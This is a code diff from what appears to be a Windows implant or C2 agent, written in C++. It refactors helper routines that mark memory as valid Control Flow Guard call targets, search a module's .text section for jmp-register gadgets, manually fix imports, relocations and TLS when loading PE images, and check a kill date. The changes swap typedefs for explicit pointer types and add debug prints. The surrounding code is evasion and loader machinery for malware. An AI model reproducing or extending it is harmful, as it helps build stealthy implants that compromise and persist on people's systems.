@@ -16,11 +16,11 @@ auto DECLFN Useful::CfgAddrAdd(
     CFG_CALL_TARGET_INFO Cfg      = { 0 };
     MEMORY_RANGE_ENTRY   MemRange = { 0 };
     VM_INFORMATION       VmInfo   = { 0 };
-    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
+    IMAGE_NT_HEADERS*    NtHdrs   = { 0 };
     ULONG                Output   = 0x00;
     NTSTATUS             Status   = STATUS_SUCCESS;
 
-    NtHdrs                  = (PIMAGE_NT_HEADERS)( U_PTR( ImageBase ) + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
+    NtHdrs                  = (IMAGE_NT_HEADERS*)( U_PTR( ImageBase ) + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
     MemRange.NumberOfBytes  = (SIZE_T)( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
     MemRange.VirtualAddress = ImageBase;
 
@@ -55,7 +55,7 @@ auto DECLFN Useful::CfgPrivAdd(
     CFG_CALL_TARGET_INFO Cfg      = { 0 };
     MEMORY_RANGE_ENTRY   MemRange = { 0 };
     VM_INFORMATION       VmInfo   = { 0 };
-    PIMAGE_NT_HEADERS    NtHeader = { 0 };
+    IMAGE_NT_HEADERS*    NtHeader = { 0 };
     ULONG                Output   = { 0 };
     NTSTATUS             Status   = { 0 };
 
@@ -109,7 +109,7 @@ auto DECLFN Useful::CfgCheck( VOID ) -> BOOL {
 
 auto DECLFN Useful::FixTls(
     _In_ PVOID Base,
-    _In_ PIMAGE_DATA_DIRECTORY DataDir
+    _In_ IMAGE_DATA_DIRECTORY* DataDir
 ) -> VOID {
     if ( DataDir->Size ) {
         PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( U_PTR( Base ) + DataDir->VirtualAddress );
@@ -136,13 +136,19 @@ auto DECLFN Useful::FindGadget(
     UINT16 JmpValue       = 0xff;
 
     SearchBase = B_PTR( ModuleBase + 0x1000 );
-    SearchSize = this->SecSize( ModuleBase, Hsh::Str<CHAR>(".text") );;    
+    SearchSize = this->SecSize( ModuleBase, Hsh::Str<CHAR>(".text") );
+
+    KhDbg( "search %p [%d]", SearchBase, SearchSize );
 
     for ( INT i = 0; i < SearchSize - 1; i++ ) {
         if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
             GadgetList[GadgetCounter] = U_PTR( SearchBase + i ); GadgetCounter++;
             if ( GadgetCounter == 10 ) break;
         }
+    }
+
+    for ( INT i = 0; i < 10; i++ ) {
+        KhDbg( "gadget #i %p", GadgetList[i] );
     }
 
     RndIndex = Rnd32() % GadgetCounter;
@@ -153,7 +159,7 @@ auto DECLFN Useful::FindGadget(
 
 auto DECLFN Useful::FixExp(
     _In_ PVOID Base,
-    _In_ PIMAGE_DATA_DIRECTORY DataDir
+    _In_ IMAGE_DATA_DIRECTORY* DataDir
 ) -> VOID {
     if ( DataDir->Size ) {
         PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)( U_PTR( Base ) + DataDir->VirtualAddress );
@@ -164,7 +170,7 @@ auto DECLFN Useful::FixExp(
 
 auto DECLFN Useful::FixImp(
     _In_ PVOID Base,
-    _In_ PIMAGE_DATA_DIRECTORY DataDir
+    _In_ IMAGE_DATA_DIRECTORY* DataDir
 ) -> BOOL {
     PIMAGE_IMPORT_DESCRIPTOR ImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)( U_PTR( Base ) + DataDir->VirtualAddress );
 
@@ -224,10 +230,10 @@ auto DECLFN Useful::SecVa(
     _In_ UPTR LibBase,
     _In_ UPTR SecHash
 ) -> ULONG {
-    PIMAGE_NT_HEADERS     Header = { 0 };
-    PIMAGE_SECTION_HEADER SecHdr = { 0 };
+    IMAGE_NT_HEADERS*     Header = { 0 };
+    IMAGE_SECTION_HEADER* SecHdr = { 0 };
 
-    Header = (PIMAGE_NT_HEADERS)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
+    Header = (IMAGE_NT_HEADERS*)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
 
     if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;
 
@@ -246,10 +252,10 @@ auto DECLFN Useful::SecSize(
     _In_ UPTR LibBase,
     _In_ UPTR SecHash
 ) -> ULONG {
-    PIMAGE_NT_HEADERS     Header = { 0 };
-    PIMAGE_SECTION_HEADER SecHdr = { 0 };
+    IMAGE_NT_HEADERS*     Header = { 0 };
+    IMAGE_SECTION_HEADER* SecHdr = { 0 };
 
-    Header = (PIMAGE_NT_HEADERS)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
+    Header = (IMAGE_NT_HEADERS*)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
 
     if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;
 
@@ -311,7 +317,7 @@ auto DECLFN Useful::CheckKillDate( VOID ) -> VOID {
 auto DECLFN Useful::FixRel(
     _In_ PVOID Base,
     _In_ UPTR  Delta,
-    _In_ PIMAGE_DATA_DIRECTORY DataDir
+    _In_ IMAGE_DATA_DIRECTORY* DataDir
 ) -> VOID {
     PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)( U_PTR( Base ) + DataDir->VirtualAddress );
     PIMAGE_RELOC           RelocInf  = { 0 };
@@ -379,7 +385,7 @@ auto DECLFN LdrLoad::_Api(
         return 0;
     }
 
-    NtHdr = reinterpret_cast<PIMAGE_NT_HEADERS>( ModBase + DosHdr->e_lfanew );
+    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + DosHdr->e_lfanew );
     if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
         return 0;
     }
